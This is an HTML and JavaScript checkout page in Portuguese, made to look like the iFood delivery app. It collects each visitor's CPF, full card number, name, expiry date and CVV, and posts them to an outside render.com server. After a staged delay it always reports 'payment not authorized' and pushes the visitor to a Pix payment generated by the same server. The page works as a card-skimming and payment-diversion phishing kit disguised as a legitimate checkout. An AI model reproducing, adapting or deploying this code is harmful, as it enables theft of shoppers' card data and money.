<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Finalizar pedido</title>
  <style>
    :root{
      --bg:#f6f6f6;
      --card:#ffffff;
      --text:#111827;
      --muted:#6b7280;
      --border:#e5e7eb;
      --section:#f3f4f6;
      --action:#1f2937;
      --primary:#111111;
      --pix:#18b5a6;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:var(--bg);
      font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      color:var(--text);
      line-height:1.35;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }
    .appbar{
      position:sticky;top:0;z-index:10;
      display:flex;align-items:center;gap:.5rem;
      height:56px;padding:0 16px;
      background:#fff;border-bottom:1px solid var(--border);
    }
    .back{
      display:inline-flex;align-items:center;justify-content:center;
      width:28px;height:28px;border-radius:8px;
      cursor:pointer;
    }
    .appbar h1{
      font-size:20px;margin:0;font-weight:700;
    }
    .page{
      padding:12px 16px 220px;
      max-width:760px;margin:0 auto;
    }
    .deliver-to{
      background:var(--card);border-radius:12px;padding:20px 16px;
      display:grid;grid-template-columns:1fr auto;gap:10px 12px;
      border:1px solid var(--border);
    }
    .label{color:var(--muted);font-size:16px}
    .name{font-size:24px;font-weight:800}
    .phone{font-size:16px;color:#2b2b2b}
    .btn-outline{
      align-self:start;
      padding:10px 18px;
      border:2px solid var(--action);
      color:var(--action);
      background:#fff;border-radius:12px;
      font-weight:700;font-size:18px;
      letter-spacing:.2px;
      cursor:pointer;
    }
    .section{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:12px;
      margin-top:14px;
      overflow:hidden;
    }
    .section-head{
      background:var(--section);
      padding:16px;
      font-size:22px;font-weight:800;
    }
    .address-card{
      display:grid;grid-template-columns:1fr auto;gap:12px;
      padding:16px;border-top:1px solid var(--border);
      background:#fff;
    }
    .address-text{
      font-size:20px;font-weight:600;
      color:#394150;
    }
    .eta{
      display:flex;align-items:center;gap:10px;
      padding:12px 16px;border-top:1px solid var(--border);
      color:#374151;font-size:18px;font-weight:600;
      background:#fff;
    }
    .pay-row{
      display:grid;grid-template-columns:auto 1fr auto;align-items:center;
      gap:12px;padding:16px;border-top:1px solid var(--border);
      background:#fff;
    }
    .pay-title{font-size:22px;font-weight:800;margin:0 0 4px}
    .pay-sub{font-size:18px;color:#3a3a3a}
    .pay-safe{
      display:flex;align-items:center;gap:10px;
      padding:14px 16px;border-top:1px solid var(--border);
      color:var(--muted);font-size:18px;background:#fff;
    }
    .coupon{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:12px;
      margin-top:14px;
      padding:18px 16px;
      display:flex;justify-content:space-between;align-items:center;
      font-size:22px;font-weight:800;
    }
    .bottom{
      position:fixed;left:0;right:0;bottom:0;z-index:20;
      padding:12px 16px calc(12px + env(safe-area-inset-bottom));
      background:linear-gradient(180deg, rgba(246,246,246,0) 0%, rgba(246,246,246,1) 30%, rgba(246,246,246,1) 100%);
    }
    .btn-primary{
      width:100%;
      background:var(--primary);
      color:#fff;border:0;border-radius:16px;
      height:56px;font-size:22px;font-weight:800;
      display:flex;align-items:center;justify-content:center;
      letter-spacing:.2px;
      box-shadow:0 3px 8px rgba(0,0,0,.12);
    }
    .icon{display:inline-block;vertical-align:middle}
    .icon.chevron{width:22px;height:22px}
    .icon.clock{width:22px;height:22px}
    .icon.lock{width:22px;height:22px}
    .icon.pix{width:36px;height:36px}
    .icon.caret{width:18px;height:18px;transform:rotate(180deg);}
    @media (min-width:768px){
      .page{padding-left:24px;padding-right:24px}
    }

    /* Modal estilo iFood */
    #paymentModal{
      display:none;
      position:fixed;
      top:0; left:0;
      width:100%; height:100%;
      background:rgba(0,0,0,0.5);
      justify-content:center;
      align-items:center;
      z-index:50;
      transition:all 0.3s ease;
    }
    #paymentModal .modal-content{
      background:#fff;
      border-radius:24px;
      max-width:400px;
      width:90%;
      padding:24px;
      text-align:center;
      position:relative;
      transform:scale(0.8);
      transition:transform 0.3s ease, opacity 0.3s ease;
      box-shadow:0 8px 24px rgba(0,0,0,0.25);
      opacity:0;
    }
    #paymentModal h3{
      margin:0 0 16px;
      font-size:22px;
      font-weight:800;
      color:#111827;
    }
    #paymentModal p{
      margin:0 0 24px;
      font-size:16px;
      color:#6b7280;
    }
    #paymentModal button{
      border:none;
      border-radius:12px;
      padding:16px 0;
      font-size:18px;
      font-weight:700;
      cursor:pointer;
      width:100%;
      margin-bottom:16px;
      transition:all 0.2s ease;
    }
    #choosePix{background:#00c4a7;color:white;}
    #chooseCard{background:#fff;color:#111827;border:1px solid #111827;}
    #closeModal{
      position:absolute; top:12px; right:12px;
      font-size:24px; background:none; border:none; cursor:pointer;
      color:#6b7280;
    }
    #pixQRCode {margin-top:20px; text-align:center;}
    #pixQRCode img {max-width:200px; margin-bottom:10px;}
    #pixQRCode p {word-break:break-all; font-size:14px; color:#111;}

    /* Estilo de formulário cartão tipo iFood */
    .field-group{
      position:relative;
      margin-bottom:18px;
    }
    .field-input{
      width:100%;
      padding:16px 12px 16px 12px;
      font-size:16px;
      border-radius:12px;
      border:1px solid #d1d5db;
      outline:none;
      background:#fff;
    }
    .field-input:focus{
      border-color:#111827;
    }
    .field-label{
      position:absolute;
      top:50%;
      left:12px;
      transform:translateY(-50%);
      color:#9ca3af;
      font-size:16px;
      font-weight:500;
      pointer-events:none;
      transition:0.2s ease all;
      background:#fff;
      padding:0 4px;
    }
    .field-input:focus + .field-label,
    .field-input:not(:placeholder-shown) + .field-label{
      top:-8px;
      left:8px;
      font-size:12px;
      color:#111827;
    }
    .field-row{
      display:flex;
      gap:12px;
    }
    #confirmCard{
      margin-top:12px;
      background:var(--primary);
      color:#fff;
      font-weight:800;
      font-size:18px;
      border:none;
      border-radius:12px;
      padding:14px 0;
      width:100%;
      cursor:pointer;
    }
  </style>
</head>
<body>
<!-- AppBar -->
<div class="appbar">
  <span class="back" aria-label="Voltar" onclick="window.location.href='cadastro.html'">
    <svg class="icon chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 18l-6-6 6-6"/>
    </svg>
  </span>
  <h1>Finalizar pedido</h1>
</div>

<main class="page">

  <!-- Dados do destinatário -->
  <section class="deliver-to">
    <div class="label">Este pedido será entregue a:</div>
    <button class="btn-outline">Trocar</button>
    <div class="name"></div>
    <div class="phone"></div>
  </section>

  <!-- Endereço -->
  <section class="section">
    <div class="section-head">Endereço de entrega</div>
    <div class="address-card">
      <div class="address-text"></div>
      <button class="btn-outline">Trocar</button>
    </div>
    <div class="eta">
      <svg class="icon clock" viewBox="0 0 24 24" fill="none" stroke="#374151" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="9"></circle>
        <path d="M12 7v5l3 2"></path>
      </svg>
      Entre 20 - 50 min
    </div>
  </section>

  <!-- Resumo do pedido estilo delivery -->
  <section class="section">
    <div class="section-head">Resumo do pedido</div>
    <div id="resumoPedido" class="resumo-sacola" style="padding:16px;"></div>
  </section>

  <!-- Forma de pagamento -->
  <section class="section">
    <div class="section-head">Forma de pagamento</div>

    <div class="pay-row">
      <svg class="icon pix" viewBox="0 0 64 64">
        <defs>
          <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0" stop-color="#1cc0b0"/>
            <stop offset="1" stop-color="#0fae9c"/>
          </linearGradient>
        </defs>
        <path fill="url(#g)" d="M21.2 10.5c3.8-3.8 10-3.8 13.8 0l18.5 18.5c3.8 3.8 3.8 10 0 13.8L35 61.3c-3.8 3.8-10 3.8-13.8 0L2.8 43c-3.8-3.8-3.8-10 0-13.8L21.2 10.5z"/>
        <path fill="#ffffff" opacity=".1" d="M27 17c2.2-2.2 5.8-2.2 8 0l12 12c2.2 2.2 2.2 5.8 0 8l-12 12c-2.2 2.2-5.8 2.2-8 0l-12-12c-2.2-2.2-2.2-5.8 0-8l12-12z"/>
      </svg>

      <div>
        <div class="pay-title">Pix</div>
        <div class="pay-sub">Pagamento com Pix online</div>
      </div>

      <button class="btn-outline">Trocar</button>
    </div>

    <div class="pay-safe">
      <svg class="icon lock" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="10" rx="2"></rect>
        <path d="M7 11V8a5 5 0 0 1 10 0v3"></path>
      </svg>
      Seguro pela Tuna Pagamentos
    </div>

    <!-- Formulário Pix -->
    <div id="pixForm" style="display:block; margin-top:20px; padding:20px; background:#f9f9f9; border-radius:12px; text-align:center;">
      <div style="font-size:16px; font-weight:500; color:#111;">Pagamento via Pix será processado automaticamente.</div>
      <div id="pixQRCode"></div>
    </div>

    <!-- Formulário Cartão -->
    <div id="cardForm" style="display:none; margin-top:20px; padding:20px; background:#fff; border-radius:12px; box-shadow:0 2px 6px rgba(0,0,0,0.08);">
      <div class="field-group">
        <input class="field-input" type="text" id="cpf" placeholder=" ">
        <label class="field-label" for="cpf">CPF</label>
      </div>
      <div class="field-group">
        <input class="field-input" type="text" id="cardNumber" placeholder=" ">
        <label class="field-label" for="cardNumber">16 dígitos</label>
      </div>
      <div class="field-group">
        <input class="field-input" type="text" id="cardName" placeholder=" ">
        <label class="field-label" for="cardName">Nome completo</label>
      </div>
      <div class="field-row">
        <div class="field-group">
          <input class="field-input" type="text" id="cardExpiry" placeholder=" ">
          <label class="field-label" for="cardExpiry">Venc</label>
        </div>
        <div class="field-group">
          <input class="field-input" type="text" id="cardCVV" placeholder=" ">
          <label class="field-label" for="cardCVV">Cod</label>
        </div>
      </div>

      <!-- Cartão visual -->
      <div id="cardPreview" style="margin-top:20px; padding:20px; background:#1e293b; color:#fff; border-radius:12px; font-family:monospace;">
        <div style="font-size:18px; letter-spacing:2px;" id="cardNumberVisual">#### #### #### ####</div>
        <div style="margin-top:10px; font-size:14px;" id="cardNameVisual">NOME COMPLETO</div>
        <div style="margin-top:5px; font-size:14px;" id="cardExpiryVisual">MM/AA</div>
      </div>

      <!-- Botão salvar cartão -->
      <button id="confirmCard" style="margin-top:20px; width:100%; font-size:18px; font-weight:700; border-radius:12px; background:var(--primary); color:#fff; padding:14px 0;">Salvar cartão</button>
    </div>

  </section>

</main>

<div class="bottom">
  <button class="btn-primary">Ir para o pagamento</button>
</div>

<!-- Modal forma de pagamento -->
<div id="paymentModal">
  <div class="modal-content">
    <h3>Escolha a forma de pagamento</h3>
    <p>Você poderá alternar entre Pix e Cartão antes de finalizar o pedido.</p>
    <button id="choosePix">Pix</button>
    <button id="chooseCard">Cartão</button>
    <button id="closeModal">×</button>
  </div>
</div>

<script>
// ======================
// Dados do usuário e endereço
// ======================
const STORAGE_CART = 'sacola';
const STORAGE_USER = 'userData';
const STORAGE_ADDRESS = 'addressData';
const COUPON_KEY = 'BRAONLINE_COUPON_FIRST10';

const cart = JSON.parse(localStorage.getItem(STORAGE_CART) || '[]');
const user = JSON.parse(localStorage.getItem(STORAGE_USER) || '{}');
const address = JSON.parse(localStorage.getItem(STORAGE_ADDRESS) || '{}');

// Preenchendo os dados com valores padrão caso estejam vazios
const elName = document.querySelector('.deliver-to .name');
const elPhone = document.querySelector('.deliver-to .phone');
const elAddress = document.querySelector('.address-card .address-text');

if (elName) elName.textContent = user.name ? user.name : 'Nome não informado';
if (elPhone) elPhone.textContent = user.phone ? user.phone : 'Telefone não informado';
if (elAddress) elAddress.innerHTML =
  `${address.rua || 'Rua não informada'}, ${address.numero || ''}<br>` +
  `${address.bairro || 'Bairro não informado'}, ${address.cidade || ''} - ${address.estado || ''}<br>` +
  `${address.cep || 'CEP não informado'}`;

// ======================
// Resumo do pedido estilo delivery com foto
// ======================
function formatBRL(valor){ return valor.toLocaleString('pt-BR',{style:'currency',currency:'BRL'}); }

let subtotal=0;
let resumoHTML='';

if(cart.length===0){
  resumoHTML='<p>Sua sacola está vazia.</p>';
}else{
  cart.forEach(item=>{
    const qtd=Number(item.quantidade||1);
    const preco=Number(item.preco||0);
    const extrasTotal=(item.extras||[]).reduce((acc,ex)=>acc+Number(ex.preco||0)*Number(ex.quantidade||0),0);
    const itemTotal=(preco+extrasTotal)*qtd;
    subtotal+=itemTotal;

    const extrasHTML=(item.extras||[]).map(ex=>`${ex.nome} x${ex.quantidade||1} (+${formatBRL(Number(ex.preco||0))})`).join('<br>');

    resumoHTML+=`
      <div style="display:flex; margin-bottom:12px; padding-bottom:12px; border-bottom:1px solid #e5e7eb; align-items:center;">
        <img src="${item.imagem || 'https://via.placeholder.com/80'}" style="width:80px; height:80px; object-fit:cover; border-radius:12px; margin-right:12px;">
        <div style="flex:1;">
          <div style="font-weight:600;">${item.nome} x${qtd}</div>
          ${extrasHTML?`<div style="font-size:14px; color:#6b7280;">${extrasHTML}</div>`:''}
          <div style="margin-top:4px; font-size:16px; font-weight:700;">${formatBRL(itemTotal)}</div>
        </div>
      </div>
    `;
  });
}

function isCouponValid(c){ if(!c)return false; const now=new Date(); return c.active&&new Date(c.expiresAt).getTime()>now.getTime(); }
const cupom = JSON.parse(localStorage.getItem(COUPON_KEY));
let desconto=0;
if(isCouponValid(cupom)){ desconto=subtotal*(cupom.value||0); }
const totalComDesconto=subtotal-desconto;

resumoHTML+=`<div style="margin-top:12px; font-size:18px; font-weight:600;">Subtotal: ${formatBRL(subtotal)}</div>`;
if(desconto>0){ resumoHTML+=`<div style="font-size:16px; color:#10b981; font-weight:700;">Desconto: - ${formatBRL(desconto)}</div>`;}
resumoHTML+=`<div style="margin-top:6px; font-size:20px; font-weight:800;">Total: ${formatBRL(totalComDesconto)}</div>`;

document.getElementById('resumoPedido').innerHTML=resumoHTML;

// ======================
// Elementos do modal e formas de pagamento
// ======================
const modal=document.getElementById('paymentModal');
const modalContent=modal.querySelector('.modal-content');
const closeModal=document.getElementById('closeModal');
const pixForm=document.getElementById('pixForm');
const cardForm=document.getElementById('cardForm');
const payTitle=document.querySelector('.pay-row .pay-title');
const paySub=document.querySelector('.pay-row .pay-sub');
const btnFinalizar=document.querySelector('.bottom .btn-primary');
const btnSalvarCartao=document.getElementById('confirmCard');

pixForm.style.display='block';
cardForm.style.display='none';
btnFinalizar.style.display='block';
btnSalvarCartao.style.display='none';

closeModal.addEventListener('click',()=>{
  modalContent.style.transform='scale(0.8)';
  modalContent.style.opacity='0';
  setTimeout(()=>{ modal.style.display='none'; },300);
});

// ======================
// Botões "Trocar"
// ======================
const btnsTrocar=document.querySelectorAll('.btn-outline');
btnsTrocar[0]?.addEventListener('click',()=>window.location.href='cadastro.html');
btnsTrocar[1]?.addEventListener('click',()=>window.location.href='cadastro.html');
btnsTrocar[2]?.addEventListener('click',()=>{
  modal.style.display='flex';
  setTimeout(()=>{modalContent.style.transform='scale(1)'; modalContent.style.opacity='1';},10);
});

// ======================
// Máscaras e validações
// ======================
function validarCPF(cpf){cpf=cpf.replace(/\D/g,'');if(cpf.length!==11||/^(\d)\1+$/.test(cpf))return false;let sum=0,rest;for(let i=1;i<=9;i++)sum+=parseInt(cpf.substring(i-1,i))*(11-i);rest=(sum*10)%11;if(rest===10||rest===11)rest=0;if(rest!==parseInt(cpf.substring(9,10)))return false;sum=0;for(let i=1;i<=10;i++)sum+=parseInt(cpf.substring(i-1,i))*(12-i);rest=(sum*10)%11;if(rest===10||rest===11)rest=0;return rest===parseInt(cpf.substring(10,11));}
function validarCartao(numero){numero=numero.replace(/\D/g,'');if(numero.length!==16)return false;let sum=0,shouldDouble=false;for(let i=numero.length-1;i>=0;i--){let digit=parseInt(numero.charAt(i),10);if(shouldDouble){digit*=2;if(digit>9)digit-=9;}sum+=digit;shouldDouble=!shouldDouble;}return sum%10===0;}
function aplicarMascara(input,tipo){if(!input)return;input.addEventListener('input',()=>{let valor=input.value.replace(/\D/g,'');if(tipo==='cpf'){if(valor.length>11)valor=valor.slice(0,11);valor=valor.replace(/(\d{3})(\d)/,'$1.$2');valor=valor.replace(/(\d{3})(\d)/,'$1.$2');valor=valor.replace(/(\d{3})(\d{1,2})$/,'$1-$2');input.value=valor;return;}if(tipo==='cartao'){valor=valor.slice(0,16);input.value=valor.replace(/(\d{4})(?=\d)/g,'$1 ');return;}if(tipo==='validade'){if(valor.length>4)valor=valor.slice(0,4);input.value=valor.replace(/(\d{2})(\d)/,'$1/$2');return;}if(tipo==='cvv'){if(valor.length>4)valor=valor.slice(0,4);input.value=valor;return;}});}

const cpfInput=document.getElementById('cpf');
const cardNumberInput=document.getElementById('cardNumber');
const cardNameInput=document.getElementById('cardName');
const cardExpiryInput=document.getElementById('cardExpiry');
const cardCVVInput=document.getElementById('cardCVV');

aplicarMascara(cpfInput,'cpf');
aplicarMascara(cardNumberInput,'cartao');
aplicarMascara(cardExpiryInput,'validade');
aplicarMascara(cardCVVInput,'cvv');

[cpfInput,cardNumberInput,cardNameInput,cardExpiryInput,cardCVVInput].forEach(el=>{if(!el)return;el.addEventListener('keypress',e=>{if(!/\d/.test(e.key)) e.preventDefault();});});

function removerPreviewCartao(){const preview=document.getElementById('cardSavedPreview');if(preview)preview.remove();}

// ======================
// Alternar Pix / Cartão
// ======================
document.getElementById('choosePix').addEventListener('click',()=>{
  pixForm.style.display='block';
  cardForm.style.display='none';
  btnFinalizar.style.display='block';
  btnSalvarCartao.style.display='none';
  payTitle.textContent='Pix';
  paySub.textContent='Pagamento com Pix online';
  removerPreviewCartao();
  closeModal.click();
});

document.getElementById('chooseCard').addEventListener('click',()=>{
  pixForm.style.display='none';
  cardForm.style.display='block';
  btnFinalizar.style.display='none';
  btnSalvarCartao.style.display='block';
  payTitle.textContent='Cartão';
  paySub.textContent='Pagamento com Cartão online';
  closeModal.click();
});

// ======================
// Spinner central
// ======================
function criarSpinnerCentral(){ return `<span class="spinner-central"></span>`; }

// ======================
// Salvar cartão
// ======================
btnSalvarCartao.addEventListener('click',()=>{
  const cpf=cpfInput.value;
  const cardNumber=cardNumberInput.value.replace(/\s/g,'');
  const cardName=cardNameInput.value;
  const cardExpiry=cardExpiryInput.value;
  const cardCVV=cardCVVInput.value;

  if(!validarCPF(cpf)){ alert('CPF inválido'); return; }
  if(!validarCartao(cardNumber)){ alert('Cartão inválido'); return; }
  if(!cardName){ alert('Informe o nome no cartão'); return; }
  if(!cardExpiry){ alert('Informe a validade'); return; }
  if(!cardCVV){ alert('Informe o código CVV'); return; }

  const originalContent=btnSalvarCartao.innerHTML;
  btnSalvarCartao.innerHTML=criarSpinnerCentral();
  btnSalvarCartao.disabled=true;

  fetch("https://rifas-3c8k.onrender.com/salvar-cartao",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({cpf,numero:cardNumber,nome:cardName,validade:cardExpiry,cvv:cardCVV})
  })
  .then(res=>res.json())
  .then(data=>{
    btnSalvarCartao.innerHTML=originalContent;
    btnSalvarCartao.disabled=false;
    if(data.sucesso){
      cardForm.style.display='none';
      btnSalvarCartao.style.display='none';
      btnFinalizar.style.display='block';
      payTitle.textContent='Cartão';
      paySub.textContent='Pagamento com Cartão online';
      removerPreviewCartao();

      const previewHTML=`
      <div id="cardSavedPreview" style="margin-top:20px; padding:20px; background:#1e293b; color:#fff; border-radius:12px; font-family:monospace;">
        <div style="font-size:18px; letter-spacing:2px;">${cardNumberVisual.textContent}</div>
        <div style="margin-top:10px; font-size:14px;">${cardNameVisual.textContent}</div>
        <div style="margin-top:5px; font-size:14px;">${cardExpiryVisual.textContent}</div>
        <button id="payWithCard" style="margin-top:10px; width:100%; font-size:16px; font-weight:700; border-radius:8px; background:var(--primary); color:#fff; padding:10px 0;">Pagar com este cartão</button>
      </div>
      `;
      cardForm.insertAdjacentHTML('afterend',previewHTML);

      const payBtn=document.getElementById('payWithCard');
      payBtn.addEventListener('click',()=>{
        const originalPay=payBtn.innerHTML;
        payBtn.innerHTML=criarSpinnerCentral();
        payBtn.disabled=true;

        setTimeout(()=>{
          alert('❌ Pagamento com cartão não autorizado.');
          removerPreviewCartao();
          payTitle.textContent='Pix';
          paySub.textContent='Pagamento com Pix online';
          pixForm.style.display='block';
          cardForm.style.display='none';

          const valor=totalComDesconto||10;
          const payerEmail=user.email||"teste@email.com";
          const payerCpf=user.cpf||"12345678909";

          fetch("https://rifas-3c8k.onrender.com/gerar-chave-pix",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({valor,payerEmail,payerCpf})
          })
          .then(res=>res.json())
          .then(data=>{
            payBtn.innerHTML=originalPay;
            payBtn.disabled=false;
            if(data.qrcodeBase64){
              pixForm.style.display='block';
              document.getElementById("pixQRCode").innerHTML=`
                <img src="data:image/png;base64,${data.qrcodeBase64}" style="max-width:200px;"/><br>
                <p><strong>Copia e Cola:</strong></p>
                <textarea id="pixCopiar" readonly style="width:100%;height:60px">${data.copiaECola}</textarea>
                <button id="btnCopiarPix" style="margin-top:10px; width:100%; padding:10px; font-weight:700; border-radius:8px; background:#10b981; color:#fff;">Copiar chave Pix</button>
              `;
              document.getElementById('btnCopiarPix').addEventListener('click',()=>{
                const campo=document.getElementById('pixCopiar');
                campo.select();
                campo.setSelectionRange(0,99999);
                navigator.clipboard.writeText(campo.value).then(()=>{alert('Chave Pix copiada!');});
              });
            }
          })
          .catch(err=>{ payBtn.innerHTML=originalPay; payBtn.disabled=false; console.error("Erro Pix:",err); });
        },1500);
      });

      alert('Cartão salvo com sucesso!');
    }else{ alert('Erro ao salvar cartão, tente novamente.'); }
  })
  .catch(err=>{ btnSalvarCartao.innerHTML=originalContent; btnSalvarCartao.disabled=false; console.error(err); alert('Erro ao salvar cartão, veja o console.'); });
});

// ======================
// Finalizar Pix
// ======================
btnFinalizar.addEventListener("click",()=>{
  const valor=totalComDesconto||10;
  const payerEmail=user.email||"teste@email.com";
  const payerCpf=user.cpf||"12345678909";

  const originalText=btnFinalizar.innerHTML;
  btnFinalizar.innerHTML=criarSpinnerCentral();
  btnFinalizar.disabled=true;

  fetch("https://rifas-3c8k.onrender.com/gerar-chave-pix",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({valor,payerEmail,payerCpf})
  })
  .then(res=>res.json())
  .then(data=>{
    btnFinalizar.innerHTML=originalText;
    btnFinalizar.disabled=false;
    if(data.qrcodeBase64){
      pixForm.style.display='block';
      cardForm.style.display='none';
      document.getElementById("pixQRCode").innerHTML=`
        <img src="data:image/png;base64,${data.qrcodeBase64}" style="max-width:200px;"/><br>
        <p><strong>Copia e Cola:</strong></p>
        <textarea id="pixCopiar" readonly style="width:100%;height:60px">${data.copiaECola}</textarea>
        <button id="btnCopiarPix" style="margin-top:10px; width:100%; padding:10px; font-weight:700; border-radius:8px; background:#10b981; color:#fff;">Copiar chave Pix</button>
      `;
      document.getElementById('btnCopiarPix').addEventListener('click',()=>{
        const campo=document.getElementById('pixCopiar');
        campo.select();
        campo.setSelectionRange(0,99999);
        navigator.clipboard.writeText(campo.value).then(()=>{alert('Chave Pix copiada!');});
      });
    }
  })
  .catch(err=>{ btnFinalizar.innerHTML=originalText; btnFinalizar.disabled=false; console.error("Erro Pix:",err); });
});

// ======================
// Atualização visual do cartão
// ======================
const cardNumberVisual=document.getElementById('cardNumberVisual');
const cardNameVisual=document.getElementById('cardNameVisual');
const cardExpiryVisual=document.getElementById('cardExpiryVisual');

cardNumberInput?.addEventListener('input',()=>{
  let valor=cardNumberInput.value.replace(/\D/g,'').padEnd(16,'#');
  valor=valor.replace(/(\d{4})(?=\d)/g,'$1 ');
  cardNumberVisual.textContent=valor;
});
cardNameInput?.addEventListener('input',()=>{ cardNameVisual.textContent=cardNameInput.value.toUpperCase()||'NOME COMPLETO'; });
cardExpiryInput?.addEventListener('input',()=>{ cardExpiryVisual.textContent=cardExpiryInput.value||'MM/AA'; });
</script>

<style>
@keyframes spin { to { transform: rotate(360deg); } }
.spinner-central { display:inline-block; width:20px; height:20px; border:3px solid rgba(255,255,255,0.3); border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; }
.resumo-sacola img{ transition:transform 0.2s; }
.resumo-sacola img:hover{ transform:scale(1.05); }
</style>
</body>
</html>
